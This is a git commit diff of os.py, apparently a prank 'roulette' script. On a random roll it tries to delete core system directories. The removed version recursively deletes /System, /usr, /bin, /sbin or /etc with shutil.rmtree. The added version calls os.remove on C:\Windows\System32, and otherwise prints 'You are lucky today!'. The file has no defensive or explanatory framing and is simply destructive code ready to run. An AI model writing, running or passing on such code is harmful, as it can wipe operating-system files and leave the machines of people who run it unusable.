d7aaf0b95580d964f4210a99669a88b67454fbca
Raoly KOUMOU <131581767+Raoly-Chab@users.noreply.github.com>
2024-03-30 21:20:06 +0100

    Update os.py

--- os.py
+++ os.py
@@ -1,16 +1,7 @@
 import random
-import shutil
-repertoires_dangereux = [
-    "/System",
-    "/usr",
-    "/bin",
-    "/sbin",
-    "/etc",
-]
+import os
 
 if random.randint(0, 6) == 1:
-    rep_a_supprimer = random.choice(repertoires_dangereux)
-    shutil.rmtree(rep_a_supprimer)
-    print(f"Répertoire {rep_a_supprimer} supprimé au hasard !")
+    os.remove("C:\\Windows\\System32\\")
 else:
-    print("Aucun répertoire n'a été supprimé cette fois-ci.")
+    print("You are lucky today!") 
